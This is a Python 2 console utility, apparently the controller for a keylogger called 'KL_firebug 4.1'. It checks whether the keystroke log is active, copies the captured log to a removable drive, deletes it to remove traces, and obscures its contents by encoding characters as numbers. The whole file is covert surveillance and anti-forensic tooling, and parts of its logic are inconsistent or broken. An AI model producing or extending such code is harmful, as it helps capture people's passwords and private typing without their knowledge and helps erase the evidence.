#firebug v4.1
import sys, shutil, os, time

def format(fname='C:\python27\log.txt'):
    print 'Formatting...'
    with open(fname) as f:
        content = f.readlines()
    content_mapped = ''.join(content)
    crypto = content_mapped.replace("\n", "")
    
    print '------------------------------------------'
    print crypto
    print '------------------------------------------'
    return crypto

def dump(dump_location, location='C:\python27\log.txt'):
    file_ = open(dump_location, 'w')
    file_.write(format(location))
    file_.close()

def clean(location='C:\python27\log.txt'):
    if os.path.exists(location):
        print 'Deleting traces...',
        try:
            os.remove(location)
        except OSError:
            print 'ERROR: with deleting file(possibly already in use)'
        else:
            print 'Done'
    else:
        print 'Already clean'

def extract(drive, rm_log=0, location='C:/python27/log.txt'):
    if os.path.exists(location):
        print 'Extracting log',
        shutil.copy2(location, drive + ':/extracted_log.txt')
        try:
            os.remove(location)
        except OSError:
            print 'ERROR: with deleting file(possibly already in use)'
        else:
            print 'Done'
    else:
        print 'No log found'

def status(location='C:/python27/log.txt'):
    if os.path.exists(location):
        try:
            os.rename(location,location.replace('/log.txt', '/logg.txt'))
            os.rename(location.replace('/log.txt', '/logg.txt'), location)
        except OSError:
            print 'Status: Active'
        else:
            print 'Status: Inactive'
        
        print 'Log found in: ' + location
        f = open(location, 'r')
        data = f.readlines()
        print 'Log size: ' + str(len(data)) + ' Characters'
    else:
        print 'No log found in: ' + location

def decrypt(key='driver', live=0, save=0, location='C:/python27/log.txt'):
    print 'Reading file...'
    output = ''
    cipher = 0
    print 'key: ' + str(key)
        
    with open(location,'r') as f:
        content = f.readlines()
        size = len(content)
        i = 0
        for word in content:
            if key != 'driver':
                content = word.split('\n')[0]
                content = int(float(content)-key)
                #print content #for live decryption
            try:
                if key == 'driver':
                    char = chr(int(content[i]))
                else:
                    char = chr(content)
                output = output + str(char)
                if (live==1):
                    print char,
                else:
                    #print 'Decrypting:' + str(i)
                    dent=1#to prevent indent
                print '{0}\r'.format(i),
                time.sleep(0.001)
                i += 1
            except:
                print 'Deciphering key error: ' + str(cipher)
                cipher += 1
        output = output.replace('\n', '')
        print ''
        print '----------------------'
        print ''
        print output
        if (save!=0):
            print 'Saving file to: ' + str(save)
            file = open(save, "w")
            file.write(output)
            file.close()

            
def encrypt(key='driver', live=0, save=0, location='C:/python27/log.txt'):
    print 'Reading file...'
    output = ''
    cipher = 0
    print 'key: ' + str(key)
        
    f = open(location, 'r')
    while True:
        ch=f.read(1)
        if not ch: break
        if key != 'driver':
            if (live == 1):
                print (float(ord(ch))+key)
            output += (str(float(ord(ch))+key)+'\n')
        else:
            if (live == 1):
                print ord(ch)
            output += (str(ord(ch))+'\n')

            
    print '----------------------'
    print ''
    print output
    if (save!=0):
        print 'Saving file to: ' + str(save)
        file = open(location, "w")
        file.write(output)
        file.close()    
def help():
    print '----------------------------------------------------------------'
    print 'help()                               --Shows this help message'
    print 'status(location)                     --Shows keylogger status'
    print 'format(fname)                        --Format file and prints result'
    print 'dump(location, dump_location)        --Format and save output'
    print 'clean(location)                      --Removes all traces'
    print 'extract(drive, rm_log, location)     --Extracts log. true to remove log'
    print 'decrypt(key, live, save, location)   --Decrypts log(if applicable) default key=driver.hijack'
    print 'encrypt(key, live, save, location)         --Encrypts file default key=driver.hijack'
    print "Default location='C:/python27/log.txt'"
    print '----------------------------------------------------------------'
print '<<KL_firebug 4.1>>'
print 'Type help() for the available commands'
while (True):
    input('firebug#> ')
